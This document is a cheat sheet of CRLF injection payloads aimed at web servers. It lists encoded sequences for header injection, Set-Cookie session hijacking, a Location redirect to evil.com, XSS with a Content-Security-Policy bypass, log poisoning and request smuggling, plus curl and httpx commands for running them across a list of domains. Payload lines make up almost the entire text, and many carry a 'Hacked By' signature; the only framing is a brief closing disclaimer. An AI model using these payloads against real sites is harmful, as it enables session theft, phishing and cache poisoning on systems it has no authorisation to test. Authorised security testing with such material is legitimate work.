**CRLF Injection Payloads**

A collection of payloads to test for CRLF (Carriage Return Line Feed) injection vulnerabilities, including HTTP header injection, response splitting, and XSS.

**Basic CRLF Payloads**
```plaintext
%0D%0A        # Standard CRLF
%0A           # LF only (Unix systems)
%0D           # CR only (rare)
%23%0D%0A     # URL-encoded # + CRLF (comment headers)
%250D%250A    # Double-encoded CRLF
```

**Header Injection Payloads**
```
# Fake Header
test%0D%0AEvil-Header: Hacked By Loca

# Set-Cookie Hijacking
%0D%0ASet-Cookie: sessionid=evil;%0D%0A

# Redirect
%0D%0ALocation: http://evil.com%0D%0A

# Cache Poisoning
%0D%0ACache-Control: no-store%0D%0A
```
**XSS via CRLF in Body**
```
# Basic XSS
%0D%0A%0D%0A<script>alert(Loca Martin)</script>

# CSP Bypass
%0D%0AContent-Security-Policy: default-src 'unsafe-inline'%0D%0A%0D%0A<script>alert(1)</script>
```
**Path/URL-Based Payloads**
```
# Path Injection**
http://example.com/%0D%0AEvil-Header: Hacked By Loca Martin

# Parameter Splitting
?param=test%0D%0AEvil-Header: Hacked By Loca Martin
```

**Advanced Bypass Techniques**
```
# Null Byte
%00%0D%0AEvil-Header: Hacked By Loca Martin

# UTF-8 Encoding
%E5%98%8A      # Overlong UTF-8 %0A

# Tab Separator
%0D%0AEvil-Header:%09Hacked By Loca Martin
```
***Log Poisoning Payloads**
```
# Fake User-Agent
User-Agent: Mozilla%0D%0AEvil-Log-Entry: Hacked By Loca Martin

# Fake Referer
Referer: http://example.com%0D%0AEvil-Log-Entry: Hacked By Loca Martin
```

**HTTP Request Smuggling**
```
GET / HTTP/1.1%0D%0AHost: example.com%0D%0A%0D%0AGET /evil HTTP/1.1
```
**Open Redirect + CRLF**
```
/redirect?url=http://evil.com%0D%0AEvil-Header: Hacked By Loca Martin
```
**Cookie Injection**
```
Cookie: legit=value%0D%0ASet-Cookie: evil=1
```
**Edge Cases**
```
# Mixed Encoding
%0d%0a        # Lowercase

# JSON/XML
{"input":"test\r\nEvil-Header: Hacked By Loca Martin"}
```

**Tools to Test These Payloads**

- Burp Suite: Intercept/modify requests

- curl:
```bash
curl -v -H "User-Agent: Payload%0D%0AEvil-Header: 1" http://example.com
```
- Browser DevTools: Inspect raw responses
- httpx
```bash
cat domains.txt | httpx -sc -H "%0D%0AEvil-Header: Hacked By Loca" -mr "Hacked By Loca"
```

**Impactful Scenarios**

    Session hijacking via Set-Cookie

    Phishing with fake Location headers

    XSS via CSP bypass

    Cache poisoning attacks

**Testing Tips**
- Test payloads in multiple contexts:
   - Headers (User-Agent, Referer, Cookies)
   - URL parameters/paths
   - POST data
 - Validate server behavior:
   - Input reflection in headers/body
   - CRLF filtering/encoding
   - Multi-layer encoding handling

⚠️ Always test responsibly with proper authorization.

🔒 Do not use these payloads maliciously.